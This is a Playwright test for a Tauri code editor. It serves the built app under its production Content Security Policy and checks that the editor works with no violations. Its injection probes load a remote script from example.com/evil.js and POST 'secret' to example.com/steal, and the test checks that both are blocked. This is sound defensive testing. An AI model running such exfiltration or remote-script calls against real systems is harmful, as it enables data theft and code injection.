import { test, expect } from "@playwright/test";
import http from "node:http";
import { existsSync, readFileSync } from "node:fs";
import path from "node:path";

/* The production frontend (dist/, from `vite build`) served with the exact Content Security Policy in
   src-tauri/tauri.conf.json: the app must work with zero violations, and injection attempts must be blocked. */
const root = process.cwd(); // Playwright runs from the project root
const dist = path.join(root, "dist");
const conf = JSON.parse(readFileSync(path.join(root, "src-tauri/tauri.conf.json"), "utf8"));
const csp = Object.entries(conf.app.security.csp as Record<string, string>).map(([key, value]) => `${key} ${value}`).join("; ");
const types: Record<string, string> = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".png": "image/png", ".svg": "image/svg+xml", ".ttf": "font/ttf", ".woff2": "font/woff2", ".json": "application/json" };
let server: http.Server;
const port = 4174;

test.beforeAll(() => {
  test.skip(!existsSync(path.join(dist, "index.html")), "Run `vite build` first (CI does).");
  server = http.createServer((req, res) => {
    let file = path.join(dist, decodeURIComponent((req.url || "/").split("?")[0]));
    if (!file.startsWith(dist) || !existsSync(file) || !path.extname(file)) file = path.join(dist, "index.html");
    res.writeHead(200, { "content-type": types[path.extname(file)] || "application/octet-stream", "content-security-policy": csp });
    res.end(readFileSync(file));
  }).listen(port);
});
test.afterAll(() => { server?.close(); });

test("production CSP: the editor works with zero violations and injection is blocked", async ({ page }) => {
  test.setTimeout(120000);
  await page.addInitScript(() => {
    const w = window as any;
    w.cspViolations = [];
    document.addEventListener("securitypolicyviolation", e => w.cspViolations.push(`${e.violatedDirective} <- ${e.blockedURI}`));
    const files: Record<string, string> = { "src/app.ts": "export function greet(name: string) {\n  return `Hello ${name}`;\n}\n", "README.md": "# Demo\n" };
    Object.assign(window, { __TAURI_INTERNALS__: { transformCallback: () => 1, unregisterCallback: () => {}, invoke: async (cmd: string, args: any = {}) => {
      if (cmd === "choose_folder") return "/tmp/csp"; if (cmd === "project_files") return Object.keys(files);
      if (cmd === "list_directory") return args.path ? [{ path: "src/app.ts", name: "app.ts", directory: false }] : [{ path: "src", name: "src", directory: true }, { path: "README.md", name: "README.md", directory: false }];
      if (cmd === "read_file") return files[args.path]; if (cmd === "git_status") return "## main";
      if (cmd === "lsp_status") return { node: "v22.16.0", npm: true, dir: "/tools", tools: [] };
      if (cmd === "plugin:event|listen") return 1; return null;
    } }, __TAURI_EVENT_PLUGIN_INTERNALS__: { unregisterListener: () => {} } });
  });
  await page.goto(`http://localhost:${port}/`);
  await page.getByRole("button", { name: /Open a project/ }).click();
  await page.locator('.tree-row[title="src"]').click();
  await page.locator('.tree-row[title="src/app.ts"]').click();
  // Monaco renders with syntax colours (its workers and styles are allowed).
  await expect(page.locator(".monaco-editor .view-lines span[class^=mtk]").first()).toBeVisible();
  expect(await page.locator(".monaco-editor .view-lines span[class^=mtk]").evaluateAll(spans => new Set(spans.map(s => getComputedStyle(s).color)).size)).toBeGreaterThan(2);
  // The TypeScript worker answers (worker-src).
  await page.locator(".monaco-editor textarea").first().focus();
  await page.keyboard.press("Control+End"); await page.keyboard.type("\ngre");
  await expect(async () => {
    await page.keyboard.press("Control+Space");
    await expect(page.locator(".suggest-widget").getByText("greet").first()).toBeVisible({ timeout: 3000 });
  }).toPass({ timeout: 60000 });
  await page.keyboard.press("Escape");
  // Injection probes: inline script, remote script and data exfiltration are all blocked.
  const probe = await page.evaluate(async () => {
    const w = window as any; w.injected = 0;
    const inline = document.createElement("script"); inline.textContent = "window.injected++"; document.body.appendChild(inline);
    const remote = document.createElement("script"); remote.src = "https://example.com/evil.js"; document.body.appendChild(remote);
    let sent = false; try { await fetch("https://example.com/steal", { method: "POST", body: "secret" }); sent = true; } catch { /* blocked */ }
    await new Promise(resolve => setTimeout(resolve, 1000));
    return { inlineRan: w.injected > 0, sent };
  });
  expect(probe).toEqual({ inlineRan: false, sent: false });
  const violations: string[] = await page.evaluate(() => (window as any).cspViolations);
  expect(violations.filter(v => !/example\.com|<- inline/.test(v)), "unexpected CSP violations").toEqual([]);
  expect(violations.length, "the three probes were reported as violations").toBeGreaterThanOrEqual(3);
});
